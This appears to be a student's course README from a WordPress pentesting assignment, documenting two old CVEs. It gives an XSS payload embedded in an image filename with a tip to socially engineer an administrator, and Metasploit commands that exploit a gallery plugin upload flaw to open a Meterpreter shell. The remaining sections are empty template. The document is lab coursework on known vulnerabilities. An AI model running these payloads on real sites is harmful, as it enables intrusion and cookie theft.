# cis221_codepath

See branches for assignments.

# Project 7 - WordPress Pentesting

Time spent: **15** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

### 1. CVE-2016-7168 -- WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename 
  - [ ] Summary: Cross-site scripting (XSS) vulnerability in the media_handle_upload function in wp-admin/includes/media.php in WordPress before 4.6.1 might allow remote attackers to inject arbitrary web script or HTML by tricking an administrator into uploading an image file that has a crafted filename. 
    - Vulnerability types: Cross-site scripting
    - Tested in version: WordPress 4.2
    - Fixed in version: WordPress 4.6.1
  - [ ] GIF Walkthrough: <img src="https://github.com/peelingwave/cis221_codepath/blob/Week-7%268-Project-Wordpress-Vs.-Kali/Pentest1-WP4.2-XSS_ImageUpload_exploit-marvin_codepath.gif" alt="Walkthrough" style="max-width: 100%;">
  - [ ] Steps to recreate: 
    -  1. Confirm WordPress target host is vulnerable. WP version must be 2.5-4.6.
    -  2. Create an image file and insert '<img src=a onerror=alert(document.cookie)>' into the filename. This is the paylod script that will cause a javascript alert. For example, I used "marvinc0d3p4th<img src=a onerror=alert(document.cookie)>.jpg"
    -  3. Use social engineering to have admin of target host to upload image file as an attachment page. Even better is if you can get the admin to use the created attachment page url to embed into a post. 
<img src="https://github.com/peelingwave/cis221_codepath/blob/Week-7%268-Project-Wordpress-Vs.-Kali/Pentest1-WP4.2-XSS_ImageUpload_exploit-marvin_codepath.png">
  - [ ] Affected source code: (https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0)
  
Reference: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html


### 2. CVE-2015-4133 -- WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit) 
  - [ ] Summary: This module exploits an arbitrary PHP code upload in the WordPress Reflex Gallery version 3.1.3. The vulnerability allows for arbitrary file upload and remote code execution. 
    - Vulnerability types: Arbitrary file upload, remote code execution.
    - Tested in version: WordPress 4.2, ReFlex Gallery plugin 3.1.3
    - Fixed in version: ReFlex Gallery plugin 3.1.4
  - [ ] GIF Walkthrough: <img src="" alt="Walkthrough" style="max-width: 100%;">
  - [ ] Steps to recreate: 
    -  1. Confirm WordPress target host is vulnerable. Reflex Gallery plugin version older than 3.1.4 must be installed and activated.
    -  2. Run metasploit from attacker machine using the following commands:
        -  sudo service postgresql start
        -  sudo msfdb init
        -  msfconsole
    -  2a. in msfconsole shell, run the following commands to install the metasploit payload and create a connection with the target machine:
        - db_status
        - search Reflex #output should be: exploit/unix/webapp/wp_reflexgallery_file_upload
        - use exploit/unix/webapp/wp_reflexgallery_file_upload
        - info
        - set RHOST <url.of.target.machine>
        - set LHOST <url.of.attacker.machine>
        - exploit
    -  3. Meterpreter shell running, run the following commands to start a new shell inside the target machine:
        - shell
        
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)


### 3. (Required) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 4. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 5. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
